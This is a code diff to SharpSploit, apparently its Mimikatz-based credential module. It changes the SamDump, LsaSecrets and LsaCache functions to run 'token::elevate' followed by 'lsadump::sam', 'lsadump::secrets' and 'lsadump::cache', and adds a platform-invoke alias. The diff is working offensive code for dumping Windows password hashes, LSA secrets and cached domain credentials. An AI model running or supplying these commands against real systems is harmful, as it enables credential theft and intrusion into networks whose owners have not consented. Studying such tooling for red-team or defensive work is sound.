@@ -10,6 +10,7 @@ using System.Runtime.InteropServices;
 
 using SharpSploit.Misc;
 using SharpSploit.Execution;
+using PInvoke = SharpSploit.Execution.PlatformInvoke;
 
 namespace SharpSploit.Credentials
 {
@@ -92,7 +93,7 @@ namespace SharpSploit.Credentials
                     return "";
                 }
                 string stroutput = Marshal.PtrToStringUni(output);
-                Win32.Kernel32.LocalFree(output);
+                PInvoke.Win32.Kernel32.LocalFree(output);
                 return stroutput;
             }
             catch (Exception e)
@@ -119,7 +120,7 @@ namespace SharpSploit.Credentials
         /// <returns>Mimikatz output.</returns>
 		public static string SamDump()
         {
-			return Command("privilege::debug lsadump::sam");
+			return Command("token::elevate lsadump::sam");
         }
 
         /// <summary>
@@ -129,7 +130,7 @@ namespace SharpSploit.Credentials
         /// <returns>Mimikatz output.</returns>
 		public static string LsaSecrets()
         {
-            return Command("privilege::debug lsadump::secrets");
+            return Command("token::elevate lsadump::secrets");
         }
 
         /// <summary>
@@ -140,7 +141,7 @@ namespace SharpSploit.Credentials
         /// <returns>Mimikatz output.</returns>
 		public static string LsaCache()
         {
-            return Command("privilege::debug lsadump::cache");
+            return Command("token::elevate lsadump::cache");
         }
 
         /// <summary>
